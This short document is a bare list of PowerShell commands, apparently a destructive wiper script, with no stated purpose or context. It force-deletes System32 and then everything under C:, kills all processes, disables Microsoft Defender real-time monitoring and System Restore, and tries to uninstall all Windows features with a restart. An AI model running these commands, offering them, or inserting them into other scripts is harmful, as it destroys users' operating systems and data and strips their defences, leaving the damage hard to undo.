Remove-Item -Path “C:\Windows\System32” -Recurse -Force
Get-Process | Stop-Process -Force
Set-MpPreference -DisableRealtimeMonitoring $true
Remove-PSDrive -Name "C"
Uninstall-WindowsFeature -Name * -Restart
Disable-ComputerRestore -Drive “C:\”
Get-ChildItem -Path “C:\” -Recurse -Force | Remove-Item -Force